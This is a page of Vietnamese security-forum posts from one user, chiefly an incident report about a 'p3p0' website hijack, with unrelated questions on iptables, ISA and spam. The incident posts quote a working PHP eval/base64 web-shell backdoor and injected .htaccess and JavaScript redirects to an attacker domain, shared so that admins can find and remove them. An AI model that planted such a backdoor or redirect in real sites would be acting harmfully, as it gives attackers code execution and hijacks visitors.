<blockquote>Tôi thì cho là chuyện này xuất phát từ việc một số các Theme hay Plugin được cài trong các bản Wordpress , joomla, Dupral này do một nhóm phát triển và họ đã âm thầm cấy mã độc vào ( hoặc các Plugin này có lỗi ). Chuyện này không phải hiếm vì trước đây thời IPB còn thịnh hành, tôi từng chứng kiến không ít các themes của IPB đã bị cài mã độc bên trong CSS, PHP , javascript<br/><br/> Điểm đáng chú ý là các cuộc tấn công hầu hết xoay quanh 3 web app chính là Wordpress, joomla và dupral , theo tôi biết thì 3 web app có nhiều thành phần mã được dùng lại của nhau và nhiều plugin 3rd party được tái cấu trúc lại cho cả 3 web app.<br/><br/> Biện pháp tôi đề nghị bây giờ là tối giản hóa các plugin không cần thiết trên webapp , dùng Dreamwaver , notepad++ hay bất kì trình editor nào hồ trợ kiếm string trong 1 thư mục để thực hiện tìm kiếm các đoạn eval(base64_encode( và xóa chúng đi ( mã nguồn gốc ít ai viết cái thứ này vào để làm gì<br/><br/> Xóa các file lạ như là cái post.php bằng cách so sán bản hiện nay và bản backup trọn bộ các file lúc ban đầu chưa có gì xảy ra.<br/><br/> Nếu có thể dựng máy ảo chạy *nix ( vì bồ nói là không thể chuyển qua *nix) làm webserver ( chỉ webserver ) vì *nix nếu config đúng sẽ giúp hạn chế tối đa khả năng phá hoại của các virus dạng này&nbsp;
</blockquote><br/><br/> Tôi cũng nghĩ giống bạn, và đã tìm-xoá hết tất cả các file .php có đoạn code &quot;eval&quot;.<br/><br/> Nhưng cái đấy không phải là đoạn code có sẵn, vì khi tôi so sánh với các bản backup trước thì không có. Điều làm tôi đau đầu là không thấy nói rõ nguyên nhân của cái vulnerability này.<br/><br/> Nhưng tôi có thể chốt lại cho anh em nào đang quản trị site được coding bằng php khi gặp trường hợp Redirect tới p3p0.com thì search và xoá tất cả dòng code có bắt đầu bằng &quot;eval(..&quot;, và phải xoá ngay Back door &quot;<b>post.php</b>&quot; với nội dung: <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php eval &#40;base64_decode&#40;$_POST&#91;&quot;php&quot;&#93;&#41;&#41;;?&gt;</pre>
</div><br/><br/> Bây giờ tới phần chua nhất. Theo tôi nghĩ, cái p3p0 chỉ là 1 đợt reconnaissance của tụi Hacker thôi, vì sau đó là sẽ tới 1 đợt đánh chính thức vào Apache và MySQL, làm tê liệt Apache sever. Đó chính là trường hợp tôi gặp hiện tại.<br/><br/> @vn.rootkit: như tôi đã nêu, sau khi remove toàn bộ website content, viết lại 1 trang thông báo đơn giản bằng php là: <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php printf &quot;Server is being maintained, please come back later...&quot; ; ?&gt;</pre>
</div> , được chưa đầy 1 ngày thì Apache sever tiếp tục chết. Kiểm tra lại trong file index.php đơn giản ấy thì thấy 1 đoạn script lạ được chèn vào<br/><br/> Từ đây có thể suy ra (không chắc 100%), các server bị dính đợt &quot;<b>p3p0</b>&quot; vẫn còn bị 1 backdoor khác, không chỉ riêng backdoor là file <b>post.php</b>, nên khi đó, dù là để 1 trang html hay php đơn giản, chúng đều bị injnect vào 1 script, dẫn tới Apache bị tê liết.<br/><br/> Giải pháp trước mắt và đang chờ đợt attack kế tiếp để xác định rõ hơn là:<br/> 1. Xoá ngay các file nào có dòng script lạ: <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;script type='text Javascript'&gt;document.location.href='http:</pre>
</div> trong các file, đa số là <b>index.*</b><br/> 2. Xoá ngay file <b>setup.php</b> trong <b>PhpMyadmin/scripts</b>. Còn nếu bạn không cần xài PhpMyadmin thì xoá hẳn nguyên thư mục này luôn. Vì đây có vẻ như là 1 vulnerability mới của PhpMyadmin.<br/> 3. Xoá file <b>.httpaccess</b> được Hackers tạo ra với nội dung:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>RewriteEngine On
RewriteBase /
RewriteRule ^&#40;.*&#41;?<span class="link"> http://...</span></pre>
</div><br/> 4. Nên sử dụng Php6 thay cho Php5.x vì nó sẽ tránh được 1 số lỗi từ connection giữa PhpMyadmin & MySQL. Khi đó thì nghiên cứu lại hàm<span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>set_magic_quotes_runtime</pre>
</div> của Php.<br/><br/> @ xnohat <blockquote>Nếu có thể dựng máy ảo chạy *nix ( vì bồ nói là không thể chuyển qua *nix) làm webserver ( chỉ webserver ) vì *nix nếu config đúng sẽ giúp hạn chế tối đa khả năng phá hoại của các virus dạng này&nbsp;
</blockquote> Thanks pro, tôi cũng biết vậy nhưng nếu tôi được phép dụng *nix server thì nói gì nữa <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom">. Cái chuối ở đây là đang bị Sếp ép sống chung với thằng Windows củ chuối, đang làm kiến nghị tách ra mà chưa được đây. Sẽ tiếp thu ý kiến của bro là chạy 1 máy chủ *nix ảo trong Windows Server hiện tại.<br/><br/> Tạm thời là vậy, có gì tôi sẽ update lên đây để anh em tiếp tục thảo luận.<br/><br/> Thanks all & Best Regards</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/36841.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/36841/226377.hva#226377,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Lâu quá không vào forum rồi, hôm nay tôi mang tới cho các bác 1 vấn đề mới để anh em mình thảo luận đây. Tầm vóc của nó (theo mình nghĩ) tương đương với lỗi zero gần đây của Microsoft.<br/><br/><br/> 1. Website & web server:<br/> - Website được 1 team rất &quot;chuối&quot; viết cho công ty tôi, không biết build bằng Framework nào, nhưng có vẻ giống develop từ WordPress.<br/> - Web sever thì là sự kết hợp tá lả của Windows sever, IIS và Apche . Nhắc tới vụ này càng nản, tôi sẽ lập Topic khác để nói về lý do tại sao tôi không thể chuyển qua *nix.<br/><br/> 2. Triệu chứng:<br/> - Một ngày đẹp trời thì các bác Sếp bảo rằng Website không thể truy cập vào bằng cách search trên Google, nhưng truy cập trực tiếp bằng cách đánh tên Website vào phần Address thì ok.<br/> - Thật vậy, khi vào Google hay bất kì websearch nào như Bing, YH!, search tên website công ty,sau đó click vào link từ Google thì bị wwwect qua trang &quot;p3p0.com&quot;. Còn truy cập trực tiếp thì vẫn ok.<br/><br/> 3. Khắc phục<br/> - Sau khi search thì có rất nhiều trang web bị bao gồm cả Joomla, Drupal, WordPress, etc.. Tôi cũng giải quyết như họ từng làm, xoá đoạn code &quot;eval(base64_decode (..&quot; xuất hiện trong 1 số file .php như config.php, common.php.<br/> - Trong thư mục includes xuất hiện files &quot;post.php&quot; với nội dung như sau: &lt;?php eval (base64_decode($_POST[&quot;php&quot;]));?&gt;<br/><br/> - Sau tất cả các bước đó thì website hoạt đông trở lại bình thường được khoảng 2 tuần.<br/><br/> 4. Nguyên nhân<br/> - Đa số đặt cho nó cái tên là p3p0 hijacking, và không thể chỉ rõ nguyên nhân, chỉ nói có thể do virus hay do FTP pasword quá yếu, bị compromised.<br/><br/> 5. Và hiện tại<br/><br/> - Bây giờ trang web chính thức bị sập. Vào xem error log của Apache thì thấy như sau:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&#91;Thu Dec 02 23:18:26 2010&#93; &#91;error&#93; &#91;client 207.46.195.225&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Thu Dec 02 23:28:09 2010&#93; &#91;error&#93; &#91;client 206.217.86.34&#93; File does not exist: xxxxxxxxxxx/images/ajax_loader.gif, referer:<span class="link"> http://www.glassegg.com/main.php</span>
&#91;Thu Dec 02 23:32:58 2010&#93; &#91;error&#93; &#91;client 205.172.229.252&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Thu Dec 02 23:32:58 2010&#93; &#91;error&#93; &#91;client 205.172.229.252&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Thu Dec 02 23:32:58 2010&#93; &#91;error&#93; &#91;client 205.172.229.252&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Thu Dec 02 23:32:59 2010&#93; &#91;error&#93; &#91;client 205.172.229.252&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Thu Dec 02 23:45:36 2010&#93; &#91;error&#93; &#91;client 65.52.110.66&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Thu Dec 02 23:50:24 2010&#93; &#91;error&#93; &#91;client 65.52.53.244&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Fri Dec 03 00:09:00 2010&#93; &#91;error&#93; &#91;client 207.46.199.184&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Fri Dec 03 01:39:29 2010&#93; &#91;error&#93; &#91;client 216.205.76.228&#93; client sent HTTP/1.1 request without hostname &#40;see RFC2616 section 14.23&#41;: /w00tw00t.at.ISC.SANS.DFind:&#41;
&#91;Fri Dec 03 02:25:42 2010&#93; &#91;error&#93; &#91;client 207.46.13.86&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Fri Dec 03 03:27:13 2010&#93; &#91;error&#93; &#91;client 207.46.13.44&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Fri Dec 03 03:53:36 2010&#93; &#91;error&#93; &#91;client 98.173.26.143&#93; File does not exist: xxxxxxxxxxx/robots.txt
&#91;Fri Dec 03 05:01:11 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; File does not exist: xxxxxxxxxxx/RAHAT
&#91;Fri Dec 03 05:01:11 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; File does not exist: xxxxxxxxxxx/phpMyAdmin1
&#91;Fri Dec 03 05:01:12 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; script 'xxxxxxxxxxx/scripts/setup.php' not found or unable to stat
&#91;Fri Dec 03 05:01:12 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; File does not exist: xxxxxxxxxxx/pmy
&#91;Fri Dec 03 05:01:12 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; File does not exist: xxxxxxxxxxx/pma
&#91;Fri Dec 03 05:01:12 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; File does not exist: xxxxxxxxxxx/sql
&#91;Fri Dec 03 05:01:12 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; File does not exist: xxxxxxxxxxx/mysql
&#91;Fri Dec 03 05:01:12 2010&#93; &#91;error&#93; &#91;client 69.41.186.62&#93; script 'xxxxxxxxxxx/scripts/setup.php' not found or unable to stat
&#91;Fri Dec 03 05:09:05 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:09:05 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:09:05 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:09:05 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:09:36 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:09:36 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:09:36 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:09:36 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:10:06 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:10:06 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:10:06 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:10:06 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:10:28 2010&#93; &#91;alert&#93; &#91;client 69.41.186.62&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration, referer:<span class="link"> http://69.20.122.101/phpMyAdmin/scripts/setup.php</span>
&#91;Fri Dec 03 05:10:28 2010&#93; &#91;alert&#93; &#91;client 69.41.186.62&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration, referer:<span class="link"> http://69.20.122.101/phpMyAdmin/scripts/setup.php</span>
&#91;Fri Dec 03 05:10:28 2010&#93; &#91;alert&#93; &#91;client 69.41.186.62&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration, referer:<span class="link"> http://69.20.122.101/phpmyadmin/scripts/setup.php</span>
&#91;Fri Dec 03 05:10:28 2010&#93; &#91;alert&#93; &#91;client 69.41.186.62&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration, referer:<span class="link"> http://69.20.122.101/phpmyadmin/scripts/setup.php</span>
&#91;Fri Dec 03 05:10:36 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:10:36 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration
&#91;Fri Dec 03 05:10:36 2010&#93; &#91;alert&#93; &#91;client 10.4.96.22&#93; xxxxxxxxxxx/.htaccess: Invalid command 'RewriteEngine', perhaps misspelled or defined by a module not included in the server configuration&quot;</pre>
</div><br/> - Trong thư mục documentroot của Apache thì xuất hiện file .htcaccess mà trước đó không có (tôi chắc chắn vì xem lại các backup thì không có), nội dung nó như sau:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>RewriteEngine On
RewriteBase /
RewriteRule ^&#40;.*&#41;?<span class="link"> http://webarh.com/2cfc333c05a36861e79c68b09b45ebeb</span></pre>
</div><br/><br/> - Trong file index.php cũng xuất hiện câu &quot;&lt;script&gt;document.location.href='http://webarh.com/2cfc333c05a36861e79c68b09b45ebeb';&lt;/script&gt;&lt;?&quot;<br/><br/> - Sau đó tôi tạm ngắt trang web và viết câu thông báo đơn giản là Website đang đươc maintenaned vào file index.php. Được 1 thời gian thì vào edit file index.php thì thấy : &quot;&lt;script type='text/javascript'&gt;document.location.href='http://webarh.com/8cad045d87c7ffec78c1b346a805b1a9'+Math.floor(Math.random()*1000000);&lt;/script&gt;&lt;?php&quot;<br/><br/> ------------End-------------------------------------------<br/><br/> Hiện giờ đang bí ở đây, mong các bác vào xem bàn luận nguyên nhân và hướng khắc phục. Vì ngay cả trên 1 số forum nổi tiếng khác cũng chưa có cách khắc phục triệt để cho p3p0 hijacking, chỉ là xoá file post.php, xoá dòng &quot;eval(base64_decode..&quot;, nhưng sau đó lại bị nữa. Còn giống Website công ty tôi hiện giờ hay không thì không biết<br/><br/> Thanks all & Best Regards,<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/32674.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/32674/201615.hva#201615,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Các bro có kinh nghiệm hay giải pháp nào để hạn chế spam mail trên Mail Server đang chạy Ipswitch IMail thì giúp mình với nha.<br/><br/> Thanks nhiều.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/31313.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/31313/193195.hva#193195,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Sao không bro nào giúp mình hết vậy, các mod đâu òi ??? Pls</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/31313.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/31313/193133.hva#193133,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Chào các bro. Mình có làm theo hướng dẫn của bác commale về thiết lập iptables cho mang Lan ảo, dùng VMWare sever 2.0.<br/><br/> Mô hinh của mình như sau:<br/> <b>Host: </b><br/> - interface vmnet1: 192.168.233.0/24 connect đến 1 client XP ảo trên VMWare theo cơ chế NAT của VMWare<br/> - interface eth0: 192.168.1.0/24 connect đến Modem và ra Internet.<br/><br/> Sau đây là đoạn code iptables của mình:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#!bin/bash
IPT=&quot;/sbin/iptables&quot;
echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward
#Define Interface and Network Address
#
LO_IF=&quot;lo&quot;
LO_IP=&quot;127.0.0.1&quot;
INT_IF=&quot;vmnet1&quot;
INT_IP=&quot;192.168.233.1&quot;
INT_NET=&quot;192.168.233.0/24&quot;
EXT_IF=`route |grep default|awk '{print $8}'`;
EXT_IP=`ifconfig $EXT_IF |awk -F &quot;inet addr:&quot; '{print $2}'|cut -d' ' -f1`;
EXT_NET=any/0
#Desine Ports
#
ICMP_OUT=&quot;0 3 4 8 11&quot;
TCP_OUT=&quot;80&quot;
#TCP_OUT=&quot;80 110 5000 5010 5100&quot;
UDP_OUT=&quot;53&quot;
OK_MAC=&quot;AA:AA:AA:AA:AA:AA BB:BB:BB:BB:BB:BB&quot;
NOTOK_MAC=&quot;CC:CC:CC:CC:CC:CC DD<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">D<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">D<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">D<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">D<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">D &quot;
HI_PORTS=&quot;1024:65535&quot;
#Create default chains
#
$IPT -F
$IPT -F -t nat
$IPT -F -t filter
$IPT -F -t mangle
$IPT -t nat -X
$IPT -t mangle -X
$IPT -X
$IPT -Z INPUT
$IPT -Z OUTPUT
$IPT -Z FORWARD
$IPT -P INPUT DROP
$IPT -P OUTPUT DROP
$IPT -P FORWARD DROP
#DNS=&quot;203.162.4.190 203.162.4.191&quot;
DNS=&quot;192.168.1.1 203.113.188.1 203.113.131.1&quot;
#INPUT & OUTPUT roles for internal
#
$IPT -A INPUT -i $INT_IF -j ACCEPT
$IPT -A OUTPUT -o $INT_IF -j ACCEPT
$IPT -A INPUT -i $EXT_IF -d $EXT_IP -j ACCEPT
$IPT -A OUTPUT -o $EXT_IF -s $EXT_IP -j ACCEPT
$IPT -A INPUT -i $LO_IF -j ACCEPT
$IPT -A OUTPUT -o $LO_IF -j ACCEPT
#DNS recursive
#
for dns in $DNS;do
$IPT -A INPUT -i $EXT_IF -s $dns -p udp --sport 53 -m state --state ESTABLISHED,RELATED -j ACCEPT
$IPT -A OUTPUT -o $EXT_IF -d $dns -p udp --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
#$IPT -A INPUT -i $EXT_IF -s $dns -p udp --sport 53 --dport $HI_PORTS -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
#$IPT -A OUTPUT -o $EXT_IF -d $dns -p udp --sport $HI_PORTS --dport 53 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
done
#TCP out
#
for tcp in $TCP_OUT;do
$IPT -A FORWARD -d $LO_IP -p tcp --dport $tcp -j ACCEPT
#$IPT -A FORWARD -i $INT_IF -s 192.168.233.2 -d 123.30.84.13 -p tcp --dport $tcp -j ACCEPT
echo &quot; Allow tcp port: &quot;$tcp;
done
#UDP out
#
for udp in $UDP_OUT;do
$IPT -A FORWARD -i $INT_IF -o $EXT_IF -s $INT_NET -d $EXT_NET -p udp --dport $udp -j ACCEPT
done
#ICMP out
#
for icmp in $ICMP_OUT;do
$IPT -A FORWARD -i $INT_IF -o $EXT_IF -s $INT_NET -d $EXT_NET -p icmp --icmp-type $icmp -j ACCEPT
done
#MAC out
#
#for mac in $OK_MAC;do
# $IPT -A FORWARD -i $INT_IF -o $EXT_IF -s $INT_NET -d $EXT_NET -m mac --mac-source $mac -p tcp --dport 20:21 -j ACCEPT
#done
#MAC denied
#
#for mac_denied in $NOTOK_MAC;do
# $IPT -A FORWARD -i $INT_IF -o $EXT_IF -s $INT_NET -d $EXT_NET -m mac --mac-source $mac_denied -p tcp --dport 20:21 -j ACCEPT
#done
#NAT
#
$IPT -A FORWARD -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
$IPT -t nat -A POSTROUTING -o $EXT_IF -j SNAT --to-source $EXT_IP
#Log bad in/out packets
#
$IPT -A INPUT -i $INT_IF -m limit --limit 1/s -j LOG --log-level 5 --log-prefix &quot;BAD_INPUT: &quot;
$IPT -A INPUT -i $INT_IF -j DROP
$IPT -A OUTPUT -o $EXT_IF -m limit --limit 1/s -j LOG --log-level 5 --log-prefix &quot;BAD_OUTPUT: &quot;
$IPT -A OUTPUT -o $EXT_IF -j DROP
$IPT -A FORWARD -i $INT_IF -o $EXT_IF -m limit --limit 1/s -j LOG --log-level 5 --log-prefix &quot;BAD_FORWARD_OUT: &quot;
$IPT -A FORWARD -i $INT_IF -o $EXT_IF -j DROP
$IPT -A FORWARD -i $EXT_IF -o $INT_IF -m limit --limit 1/s -j LOG --log-level 5 --log-prefix &quot;BAD_FORWARD_IN: &quot;
$IPT -A FORWARD -i $EXT_IF -o $INT_IF -j DROP</pre>
</div><br/><br/> Em đã config gần như y chang bác conmale đã chỉ, test trên client XP thì thấy hình như vòng lặp dành cho $TCP_OUT không có tác dụng. Vì em đã thử disable vòng lặp này rùi, theo nguyên lý thì máy con sẽ không ra Internet được bằng các tcp port. Nhưng trên thực tế thì client XP vẫn duyệt web ầm ầm.<br/><br/> Em không biết là mình configure có sai chỗ nào không, hay là tại nguyên lý NAT của máy VMWare Sever 2.0 là sẽ nhận toàn bộ packet từ máy ảo, rùi nó sẽ đóng gói lại rùi mới gửi đi, vì chỉ có như vậy iptables sẽ không filter được và client XP mới ra vào Internet thoải mái như vậy<br/><br/> thanks các bro nhiều</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/28368.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/28368/174545.hva#174545,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Mình đã làm đc rùi. thanks nhiều.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/28368.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/28368/174535.hva#174535,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">À, không biết IP của external card của 2 ISA có phải cùng lớp mạng không vậy? Tại mình thấy mấy ví dụ trên Net thì đều xài IP cho card ISA ở 2 site đều là cùng lớp mạng với nhau.<br/><br/> Mình cần Confirm vấn đề này, tại vì nếu đổi IP cho card external của ISA lại thì gần như sẽ đổi lại toàn bộ IP Inastructure. </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/28368.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/28368/174534.hva#174534,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
